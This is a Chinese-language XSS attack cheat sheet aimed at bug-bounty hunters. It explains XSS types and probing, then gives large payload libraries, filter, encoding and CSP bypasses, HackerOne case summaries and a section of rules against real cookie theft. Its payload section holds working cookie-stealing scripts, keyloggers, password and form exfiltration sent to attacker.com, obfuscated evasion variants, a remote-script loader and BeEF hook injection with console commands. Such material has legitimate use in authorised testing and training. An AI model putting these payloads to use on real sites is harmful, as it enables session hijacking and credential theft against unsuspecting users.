# XSS

> 视角：黑盒，目标是让脚本在受害者浏览器执行

## 1. 一句话说清

XSS = 把用户输入当代码执行（HTML/JS）。
- **存储型**：input 进 DB，访客触发——价值最高（盲打管理员）。
- **反射型**：input 在 URL 立即回显——价值最低，多数平台不收。
- **DOM**：纯客户端，不经服务端——常被遗漏。
- **mXSS**：序列化/反序列化时浏览器解析差异。

SRC 价值：管理后台 stored XSS = P1（$300–$3k）；普通 reflected = P3 / 拒收。

---

## 2. 高频输出点（按 wooyun 案例）

| 输出点 | 触发 | 典型 |
|--------|------|------|
| 用户昵称 / 签名 | 页面加载 | 个人主页、评论 |
| 搜索回显 | 搜索 | 历史 / 结果页 |
| 评论 / 留言 | 展示 | 论坛、商品评价 |
| 文件名 / 描述 | 列表 | 网盘、相册 |
| 邮件正文 / 标题 | 打开 | 邮箱系统 |
| URL 参数回显 | 渲染 | 分享链接 |
| 订单备注 | 后台查看 | 电商工单 |
| API 回调参数 | JS 执行 | JSONP |

### 易遗漏点

- **HTTP 头反射**：X-Forwarded-For → 日志后台、UA → 统计面板
- **Mobile/WAP 同步**：APP 写入 → Web 显示
- **二次渲染**：草稿箱 / 审核列表 / 后台
- **Source map / JSON 注入**：`/api/data?cb=alert(1)`

---

## 3. 探测手法

### 3.1 上下文识别（先看落点）

| 上下文 | 闭合 | 探针 |
|--------|------|------|
| HTML 标签内 | `<` | `<svg onload=alert(1)>` |
| 属性 | 引号 | `" autofocus onfocus=alert(1) "` |
| URL 属性 | 协议 | `javascript:alert(1)` |
| JS 字符串 | 引号 | `";alert(1);//` |
| JS JSON | 引号 + 闭合 | `'-alert(1)-'`、`"};alert(1);//` |
| CSS（IE） | 函数 | `xss:expression(alert(1))` |

### 3.2 Payload 库（按上下文）

#### HTML 标签内

```html
<script>alert(1)</script>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onload=alert(1)>
<frameset onload=alert(1)>
```

#### 属性内

```
" onclick=alert(1) "
" onmouseover=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
'-alert(1)-'
\";alert(1);//
```

#### JS 字符串

```js
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URL

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 3.3 编码绕过

| 编码 | 示例 |
|------|------|
| HTML 实体 | `&#60;script&#62;alert(1)&#60;/script&#62;` |
| 16 进制实体 | `&#x3c;script&#x3e;` |
| Unicode | `<iframe/onload=alert(1)>` |
| URL | `%3cscript%3ealert(1)%3c/script%3e` |
| 双重 URL | `%253cscript%253e` |
| Base64 in data | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |

### 3.4 关键字 / 括号绕过

```js
// alert 绕过
window['al'+'ert'](1)
self['al'+'ert'](1)
Function('alert(1)')()
eval('al'+'ert(1)')
[].constructor.constructor('alert(1)')()

// Unicode 关键字
alert(1)

// 括号绕过
alert`1`                     // 模板字符串
throw onerror=alert,1        // 异常 + 简写
location='javascript:alert(1)'

// String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)

// btoa / atob
eval(atob('YWxlcnQoMSk='))
```

### 3.5 DOM XSS 危险源 / 汇

```js
// 源（攻击者可控）
location.href / location.search / location.hash / location.pathname
document.URL / document.documentURI / document.referrer
window.name
document.cookie
postMessage data

// 汇（执行点）
eval()  Function()  setTimeout(string)  setInterval(string)
innerHTML / outerHTML / insertAdjacentHTML
document.write / document.writeln
element.src / element.href
$('...')   .html(...)
```

测试：
```bash
# 改 location.hash
https://target/page.html#<img src=x onerror=alert(1)>

# 改 location.search
https://target/page.html?q=</script><script>alert(1)</script>

# 改 referrer
访问 attacker.com → click → target.com（attacker.com 含 payload）

# postMessage（跨窗口）
parent.postMessage('<img src=x onerror=alert(1)>','*')
```

工具：浏览器 DevTools 断点 + Sources tab 跟踪。

### 3.6 盲打 XSS（管理员触发）

```html
<script src=https://your-xss-hunter.com/abc></script>
```

平台：
- **XSS Hunter Express**（自建）
- 自己的 OOB（webhook.site 简易但无 cookie 抓取）

适用：
- 后台审核（用户昵称 / 留言 / 反馈）
- 工单系统
- 留言反馈

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| 标签拦 `<script>` | `<svg>`、`<img>`、`<details>`、`<marquee>`、`<video>` |
| `script` 关键字 | `<scr<script>ipt>`（双写）、`<sCrIpT>`（大小写）、`<%73cript>`（编码） |
| `alert` 关键字 | `confirm` / `prompt` / `print` / `top.alert` / `Function('alert(1)')()` |
| 引号过滤 | 无引号属性：`<img src=x onerror=alert(1)>` |
| 长度限制 | 外部加载 `<script src=//xss.cc/j>` / 短链 |
| HTML5 sandbox | `<iframe srcdoc>` 内的 `<script>` |
| HTTPOnly Cookie | XSS 读不到，但仍能 CSRF / 钓鱼 / 改密码 |
| CSP | `script-src 'self'` 时找 jsonp endpoint / unsafe-eval / dangling markup |

### CSP 绕过常见思路

```
1. CSP 含 'unsafe-inline' → 直接 inline script
2. CSP 含 'unsafe-eval' → eval / Function
3. CSP 含 jsonp 友好域 → <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.0/angular.js"></script>
4. nonce 静态 → 复用
5. base-uri 缺 → <base href="//attacker.com">
6. dangling markup（无脚本）→ <img src='//attacker.com/?
```

---

## 5. 利用提权 / 横向

```
反射 XSS → 钓鱼链接 → cookie 偷取（无 HttpOnly）
存储 XSS → 后台 admin 触发 → 偷 cookie / CSRF / 改密码 / 读页面
DOM XSS → 同上
mXSS → 复制粘贴 / 邮件预览触发

→ SRC 报告时不要做实际钓鱼。仅 alert(1) 弹窗 / cookie/document.domain 截图 即可
```

### 配合升级

```
反射 XSS + Self-XSS（自己后台只能给自己看） → 配合 CSRF 让别人帮触发 → P0
存储 XSS + 后台 → 后台沦陷 → P0
DOM XSS + postMessage → 跨域读 → P0
```

---

## 6. 真实案例指纹

| 类型 | 案例 |
|------|------|
| 存储 XSS | 大街网（蠕虫）、某社交（蠕虫） |
| 反射 XSS | 开心网、某搜索引擎贴吧 |
| DOM XSS | 某互联网公司 document.domain、某社交 Flash htmlText |
| Flash XSS | 音悦台 LSO Rootkit、某邮箱 crossdomain.xml |
| mXSS | 某社交邮箱、某邮箱 |
| 盲打 | 苏宁、成都公安、快速问医生（管理员触发） |

通用指纹：
- 输入 `<svg onload=alert(1)>` 显示在 DOM 中（F12 看 elements） → 命中
- 浏览器 alert 弹窗 → 命中
- HTML 中含 `<script>` 包裹的不可信数据 → 模板渲染缺转义

---

## 7. 复现 / 证据要点

### 7.1 PoC 必备

1. 触发 URL（含 payload）
2. **alert 弹窗截图**（含 URL bar）
3. DOM 内 payload 截图（F12）
4. 不同浏览器测试结果（Chrome / Firefox / Safari，至少 2 个）
5. CSP / X-XSS-Protection 头分析

### 7.2 模板

```http
GET /search?q=%3Csvg%20onload%3Dalert(document.domain)%3E HTTP/1.1
Host: target.com

→ HTML 响应中：
<div class="search-result">您搜索的内容：<svg onload=alert(document.domain)></div>

→ 浏览器执行 alert，弹出：target.com
```

### 7.3 CVSS

```
存储 XSS（管理后台）        = 6.1–8.0
存储 XSS（用户互看）        = 6.1
反射 XSS（无认证）          = 6.1
DOM XSS                    = 6.1
Self-XSS（自己看自己）      = 通常拒收
mXSS / 邮件预览             = 6.5–8.1
盲打成功（admin 触发）       = 7.5–8.5
```

### 7.4 影响段

```
通过 /search 接口的 q 参数，攻击者可注入 HTML/JS 代码并在受害者浏览器执行。
该参数无认证可访问，CSP 仅设 default-src 'self'，未限制 inline。

实际可：
1. 偷取受害者会话 cookie（无 HttpOnly 时）
2. 触发 CSRF 完成敏感操作
3. 钓鱼到伪造登录页

测试时仅用 alert(document.domain) 弹窗证明，未尝试任何 cookie 偷取。
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__browser_evaluate_cdp_target` | browser | 在受害域执行 payload 验证 DOM XSS / 盲打 |
| `mcp__jshook__ast_transform_apply` | transform | 反混淆混淆 JS / AST 改写还原 sink |
| `mcp__jshook__debugger_pause` + `mcp__jshook__get_call_stack` | debugger | 设断点追踪 sink 调用链 |
| `mcp__jshook__hook_preset` | hooks | 装 eval / atob / Function preset,捕获运行时反序列化 |
| `mcp__jshook__sourcemap_reconstruct_tree` | sourcemap | 还原原始源码定位 sink |

完整映射:[`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：实际偷取真实用户 cookie / token。Self-cookie 演示即可。
- **禁**：用存储 XSS 在公开评论区埋 payload（其他人会触发）。在自己控制的位置（自己的留言、自己的资料）测。
- **禁**：盲打到陌生管理员的 cookie 后用它登录。仅证明回调收到，截图后立即作废。
- **禁**：构造真实钓鱼页面（伪造登录）。
- **禁**：批量蠕虫式传播（一个朋友圈或全平台）。
- **报告中**：cookie / token 必须脱敏到只剩 head/tail。

## H1 真实案例

_共 335 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| High | — | GitLab | [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) | Summary I found Stored XSS using Wiki-specific Hierarchical link Markdown in Wiki pages |
| Critical | 7500 usd | Valve | [XSS in steam react chat client](https://hackerone.com/reports/409850) | The Steam chat client both sends and receives bbcode format chat messages |
| High | — | Grab | [[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure](https://hackerone.com/reports/401793) | [Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure |
| Critical | 16000 usd | GitLab | [Stored XSS in markdown via the DesignReferenceFilter](https://hackerone.com/reports/1212067) | Summary When rendering markdown, links to designs are parsed using the following `link_reference_pattern`: https://gitlab.com/g… |
| High | — | TikTok | [Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration](https://hackerone.com/reports/968082) | Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration |
| Critical | 1000 usd | CS Money | [Blind XSS on image upload](https://hackerone.com/reports/1010466) | Summary: The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ ori… |
| High | 5000 usd | Reddit | [[accounts.reddit.com] Redirect parameter allows for XSS](https://hackerone.com/reports/1962645) | Summary: Hello team! I was tampering with the dest parameter in accounts.reddit.com and found out it is vulnerable to Cross Sit… |
| High | 13950 usd | GitLab | [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) | Summary If Kroki has been enabled, it's possible to craft a `pre` block so that arbitrary attributes can be injected into the r… |
| Critical | 5000 usd | Basecamp | [HEY.com email stored XSS](https://hackerone.com/reports/982291) | An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails |
| High | — | WordPress | [Stored XSS Vulnerability](https://hackerone.com/reports/643908) | Hi there, I found a stored xss @ https://core.trac.wordpress.org/ Steps: 1 |
| Critical | — | X / xAI | [Blind XSS on Twitter's internal Big Data panel at █████████████](https://hackerone.com/reports/1207040) | Blind XSS on Twitter's internal Big Data panel at █████████████ |

**命中本类的 weakness 分布：**

- Cross-site Scripting (XSS) - Stored：166 条
- Cross-site Scripting (XSS) - Generic：74 条
- Cross-site Scripting (XSS) - Reflected：51 条
- Cross-site Scripting (XSS) - DOM：29 条
- Uncategorized → 手工归类：12 条
- Reflected XSS：1 条
- Improper Neutralization of HTTP Headers for Scripting Syntax：1 条
- Cross-Site Scripting (XSS)：1 条


## Payload 库

_12 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_

### 反射型XSS  `xss-reflected`
反射型跨站脚本攻击技术
子类：**反射型** · tags: `xss` `reflected` `javascript`

**前置条件：** 存在用户输入反射到页面；输入未经过滤或编码

**攻击链：**

**1. 1. 探测XSS注入点**
_基础XSS探测_
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onfocus=alert(1) autofocus "
```

**2. 2. 事件处理器绕过**
_使用各种事件处理器_
```
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**3. 3. 标签绕过**
_大小写混淆和标签变形_
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
```

**4. 4. 窃取Cookie**
_窃取用户Cookie_
```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>location="http://attacker.com/steal?c="+document.cookie</script>
```

**5. 5. 键盘记录**
_记录用户键盘输入_
```
<script>
document.onkeypress=function(e){
  fetch("http://attacker.com/log?key="+e.key)
}
</script>
```

**WAF/EDR 绕过变体：**

**1. HTML实体编码**
_使用HTML实体编码绕过_
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

**2. Unicode编码**
_使用Unicode编码绕过_
```
<script>\u0061lert(1)</script>
<img src=x onerror=\u0061lert(1)>
```

**3. 双写绕过**
_双写绕过关键字删除_
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```

**4. 注释混淆**
_使用注释混淆_
```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```

---

### 存储型XSS  `xss-stored`
存储型跨站脚本攻击技术
子类：**存储型** · tags: `xss` `stored` `persistent`

**前置条件：** 存在数据存储功能；存储数据未经过滤显示

**攻击链：**

**1. 1. 探测存储点**
_探测存储型XSS_
```
在评论区、用户名、个人简介等处输入:
<script>alert(1)</script>
"><script>alert(1)</script>
测试是否存储并执行
```

**2. 2. 隐蔽Payload**
_使用隐蔽的XSS payload_
```
<img src=x onerror=alert(1) style="display:none">
<svg/onload=alert(1) style="position:absolute;left:-9999px">
<div style="background:url(javascript:alert(1))">
```

**3. 3. 持久化控制**
_加载外部恶意脚本_
```
<script>
if(!window.xss_loaded){
  window.xss_loaded=true;
  var s=document.createElement("script");
  s.src="http://attacker.com/evil.js";
  document.body.appendChild(s);
}
</script>
```

**4. 4. BeEF Hook**
_使用BeEF框架控制浏览器_
```
<script src="http://beef-server:3000/hook.js"></script>
或:
<script>
var s=document.createElement("script");
s.src="http://beef-server:3000/hook.js";
document.body.appendChild(s);
</script>
```

**WAF/EDR 绕过变体：**

**1. SVG标签绕过**
_使用SVG标签绕过_
```
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```

**2. Math标签绕过**
_使用MathML标签_
```
<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>
```

---

### DOM型XSS  `xss-dom`
基于DOM的跨站脚本攻击
子类：**DOM型** · tags: `xss` `dom` `javascript`

**前置条件：** 存在JavaScript动态操作DOM；用户输入直接写入DOM

**攻击链：**

**1. 1. 探测DOM XSS**
_探测DOM型XSS_
```
#<script>alert(1)</script>
?param=<img src=x onerror=alert(1)>
检查location.hash、location.search等是否直接写入DOM
```

**2. 2. 常见Sink点**
_常见的DOM XSS Sink点_
```
document.write(location.hash)
innerHTML = location.search
eval(location.hash)
setTimeout(location.hash, 0)
jQuery(html)
$(location.hash)
```

**3. 3. location.hash利用**
_利用location.hash_
```
URL: http://target.com/#<img src=x onerror=alert(1)>
如果页面有: document.write(location.hash)
则触发XSS
```

**4. 4. postMessage利用**
_利用postMessage_
```
window.addEventListener("message", function(e){
  document.getElementById("output").innerHTML = e.data;
});
攻击页面:
targetWindow.postMessage("<img src=x onerror=alert(1)>", "*");
```

**WAF/EDR 绕过变体：**

**1. javascript:协议变体绕过**
_使用大小写混淆、HTML实体编码、制表符插入等方式绕过javascript:协议过滤_
```
javascript:alert(1)
javascript	:alert(1)
jaVaScRiPt:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>
```

**2. SVG/MathML标签与事件处理器绕过**
_利用SVG、MathML等非标准HTML标签及冷门事件处理器(ontoggle、onpageshow)绕过标签和事件黑名单_
```
<svg onload=alert(1)>
<svg/onload=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
<details open ontoggle=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
```

---

### CSP绕过  `xss-csp-bypass`
绕过内容安全策略(CSP)的XSS技术
子类：**CSP绕过** · tags: `xss` `csp` `bypass`

**前置条件：** 存在XSS漏洞；存在CSP策略但配置不当

**攻击链：**

**1. 1. 分析CSP策略**
_分析CSP配置_
```
查看HTTP响应头:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
或使用CSP Evaluator工具分析
```

**2. 2. 利用unsafe-inline**
_利用unsafe-inline配置_
```
如果CSP包含unsafe-inline:
<script>alert(1)</script>
可以直接执行内联脚本
```

**3. 3. 利用unsafe-eval**
_利用unsafe-eval配置_
```
如果CSP包含unsafe-eval:
<script>eval("alert(1)")</script>
<script>setTimeout("alert(1)", 0)</script>
可以使用eval等函数
```

**4. 4. JSONP绕过**
_利用JSONP绕过_
```
如果允许的域名有JSONP端点:
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>
利用JSONP回调执行代码
```

**5. 5. AngularJS绕过**
_利用AngularJS绕过CSP_
```
如果允许了AngularJS CDN:
<div ng-app ng-csp>
<div ng-focus="$event.path|orderBy:'[].constructor.from([alert(1)])'" tabindex=0>
</div>
</div>
```

**6. 6. Dangling Markup**
_利用悬挂标记窃取数据_
```
<img src='http://attacker.com/?
捕获后续HTML内容直到遇到单引号
```

**WAF/EDR 绕过变体：**

**1. JSONP端点劫持CSP**
_利用CSP白名单域上的JSONP回调端点或AngularJS库执行任意JavaScript，无需unsafe-inline_
```
# 寻找白名单域上的JSONP端点:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>
```

**2. base-uri劫持与script nonce泄露**
_利用CSP未限制base-uri指令劫持脚本加载源，或通过CSS注入/DOM接口泄露script nonce值_
```
# base-uri未限制时:
<base href="http://attacker.com/">
# 页面中相对路径的脚本将从attacker.com加载

# nonce泄露利用:
# 通过CSS注入窃取nonce:
<style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
# 或通过DOM读取: document.querySelector("script[nonce]").nonce
```

---

### 突变型XSS(mXSS)  `xss-mxss`
利用浏览器解析差异导致的XSS攻击
子类：**突变型** · tags: `xss` `mxss` `mutation` `bypass`

**前置条件：** 存在HTML输出点；浏览器解析差异

**攻击链：**

**1. 1. 基础mXSS探测**
_利用noscript标签解析差异_
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**2. 2. SVG mXSS**
_SVG CDATA突变_
```
<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>
<svg><script><![CDATA[alert(1)]]></script></svg>
```

**3. 3. Math mXSS**
_MathML突变XSS_
```
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**4. 4. DOM clobbering配合**
_利用DOM clobbering_
```
<form id=x></form><form id=x><img src=x onerror=alert(1)></form>
```

**WAF/EDR 绕过变体：**

**1. 嵌套标签绕过**
_SVG内脚本编码绕过_
```
<svg><script>&#97;lert(1)</script></svg>
<svg><script>a&#108;ert(1)</script></svg>
```

---

### Unicode XSS  `xss-unicode`
利用Unicode编码特性绕过过滤
子类：**Unicode编码** · tags: `xss` `unicode` `encoding` `bypass`

**前置条件：** 存在XSS注入点；过滤器检查关键字

**攻击链：**

**1. 1. Unicode转义**
_JavaScript Unicode转义_
```
<script>\u0061lert(1)</script>
<script>\x61lert(1)</script>
<script>\u{61}lert(1)</script>
```

**2. 2. HTML实体编码**
_HTML十进制/十六进制实体_
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

**3. 3. Unicode规范化攻击**
_利用Unicode规范化_
```
使用规范化等效字符:
＜script＞alert(1)＜/script＞
使用全角字符绕过
```

**4. 4. UTF-7编码**
_UTF-7编码XSS_
```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
需要页面使用UTF-7编码
```

**WAF/EDR 绕过变体：**

**1. 混合编码绕过**
_混合多种编码方式_
```
<img src=x onerror=\u0061&#108;ert(1)>
<img src=x onerror="\u0061lert`1`">
```

**2. 过长UTF-8编码**
_利用服务器UTF-8解析差异_
```
<img src=x onerror=alert(1)>
使用非最短UTF-8编码形式
```

---

### XSS过滤器绕过  `xss-filter-bypass`
各种绕过XSS过滤器的技术
子类：**过滤器绕过** · tags: `xss` `filter` `bypass` `waf`

**前置条件：** 存在XSS注入点；存在过滤机制

**攻击链：**

**1. 1. 大小写混淆**
_混合大小写绕过_
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SvG OnLoAd=alert(1)>
```

**2. 2. 双写绕过**
_双写绕过关键字删除_
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```

**3. 3. 注释混淆**
_使用注释混淆_
```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```

**4. 4. 空字节截断**
_空字节截断绕过_
```
<scr\x00ipt>alert(1)</script>
<img src=x onerror=alert\x00(1)>
```

**5. 5. 标签属性绕过**
_利用空白字符绕过_
```
<img src=x onerror=alert(1)>
<img src=x onerror =alert(1)>
<img src=x onerror	=alert(1)>
<img src=x onerror
=alert(1)>
```

**6. 6. 事件处理器变体**
_使用少见的事件处理器_
```
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
```

**WAF/EDR 绕过变体：**

**1. Data URI绕过**
_使用Data URI_
```
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
```

**2. SVG动画绕过**
_SVG动画事件_
```
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```

---

### XSS编码绕过  `xss-encoding`
利用各种编码技术绕过XSS过滤
子类：**编码绕过** · tags: `xss` `encoding` `bypass`

**前置条件：** 存在XSS注入点；存在编码处理

**攻击链：**

**1. 1. URL编码**
_URL编码绕过_
```
<img src=x onerror=%61lert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
```

**2. 2. HTML实体编码**
_HTML实体编码_
```
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=&#x61;lert(1)>
&lt;script&gt;alert(1)&lt;/script&gt;
```

**3. 3. JavaScript编码**
_JavaScript编码_
```
<img src=x onerror="\u0061lert(1)">
<img src=x onerror="\x61lert(1)">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

**4. 4. CSS编码**
_CSS编码（旧版IE）_
```
<style>body{background:url("javascript:alert(1)")}</style>
<div style="x:expression(alert(1))">
```

**5. 5. 混合编码**
_混合多种编码_
```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```

**WAF/EDR 绕过变体：**

**1. 双重URL编码**
_双重URL编码_
```
%253Cscript%253Ealert(1)%253C/script%253E
服务器解码两次时使用
```

**2. UTF-16编码**
_UTF-16编码绕过_
```
%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E
```

---

### Polyglot XSS  `xss-polyglot`
多环境通用的XSS payload
子类：**Polyglot** · tags: `xss` `polyglot` `universal`

**前置条件：** 存在XSS注入点；不确定具体环境

**攻击链：**

**1. 1. 经典Polyglot**
_经典多环境Polyglot_
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**2. 2. 短Polyglot**
_短版本Polyglot_
```
'"-->]]>*/</script></style></title></textarea><script>alert(1)</script>
```

**3. 3. 属性注入Polyglot**
_属性值注入Polyglot_
```
'onmouseover=alert(1) x='
"onfocus=alert(1) autofocus x="
'onclick=alert(1)//
```

**4. 4. URL参数Polyglot**
_URL参数Polyglot_
```
javascript:alert(1)//http://
data:text/html,<script>alert(1)</script>
```

**WAF/EDR 绕过变体：**

**1. 高级Polyglot**
_简洁高效Polyglot_
```
-->'"<svg onload=alert(1)>"><script>alert(1)</script>
```

---

### XSS Cookie窃取  `xss-cookie-theft`
利用XSS窃取用户Cookie
子类：**Cookie窃取** · tags: `xss` `cookie` `theft` `session`

**前置条件：** 存在XSS漏洞；Cookie未设置HttpOnly

**攻击链：**

**1. 1. 基础Cookie窃取**
_使用Image对象发送Cookie_
```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```

**2. 2. Fetch API窃取**
_使用Fetch/Beacon API_
```
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>navigator.sendBeacon("http://attacker.com/steal", document.cookie)</script>
```

**3. 3. XMLHttpRequest窃取**
_使用XHR发送_
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
xhr.send();
</script>
```

**4. 4. 编码传输**
_Base64编码传输_
```
<script>
var data = btoa(document.cookie);
new Image().src="http://attacker.com/steal?c="+data;
</script>
```

**5. 5. 完整利用脚本**
_收集完整信息_
```
<script>
var img = new Image();
img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
</script>
```

**WAF/EDR 绕过变体：**

**1. 混淆绕过**
_变量混淆绕过_
```
<script>var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")</script>
```

---

### XSS键盘记录  `xss-keylogger`
利用XSS记录用户键盘输入
子类：**键盘记录** · tags: `xss` `keylogger` `credential`

**前置条件：** 存在存储型XSS；目标页面有敏感输入

**攻击链：**

**1. 1. 基础键盘记录**
_监听键盘按键_
```
<script>
document.addEventListener("keypress", function(e){
  new Image().src = "http://attacker.com/log?key=" + e.key;
});
</script>
```

**2. 2. 完整键盘记录**
_按Enter发送记录_
```
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
</script>
```

**3. 3. 表单窃取**
_窃取密码字段_
```
<script>
document.querySelectorAll("input[type=password]").forEach(function(input){
  input.addEventListener("change", function(){
    new Image().src = "http://attacker.com/log?pwd=" + this.value;
  });
});
</script>
```

**4. 4. 表单提交劫持**
_劫持表单提交_
```
<script>
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
  });
});
</script>
```

**WAF/EDR 绕过变体：**

**1. 混淆版本**
_十六进制混淆_
```
<script>var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})</script>
```

---

### BeEF框架利用  `xss-beef`
使用BeEF框架进行XSS利用
子类：**BeEF利用** · tags: `xss` `beef` `framework` `exploitation`

**前置条件：** 存在XSS漏洞；部署BeEF服务器

**攻击链：**

**1. 1. 部署BeEF**  _[linux]_
_部署BeEF服务器_
```
# 安装BeEF
git clone https://github.com/beefproject/beef
cd beef
bundle install
./beef

# 默认运行在 http://localhost:3000
# 默认用户名: beef
# 默认密码: beef
```

**2. 2. 注入Hook脚本**
_注入BeEF Hook_
```
<script src="http://attacker.com:3000/hook.js"></script>
注入短版本:
<script src="//attacker.com:3000/hook.js"></script>
```

**3. 3. 常用命令**
_BeEF控制台命令_
```
# BeEF控制台常用命令
# 查看在线僵尸
beef> online_browsers

# 执行命令
beef> run social_engineering fake_notification

# 获取Cookie
beef> run browser get_cookies

# 重定向页面
beef> run browser redirect https://evil.com
```

**4. 4. 模块利用**
_BeEF模块列表_
```
# 常用模块
# 社会工程学
- Fake Notification
- Fake Flash Update
- Pretty Theft

# 浏览器攻击
- Get Cookie
- Redirect Browser
- TabNabbing

# 网络攻击
- DNS Spoofing
- Ping Sweep
- Port Scanner
```

**WAF/EDR 绕过变体：**

**1. 混淆Hook URL**
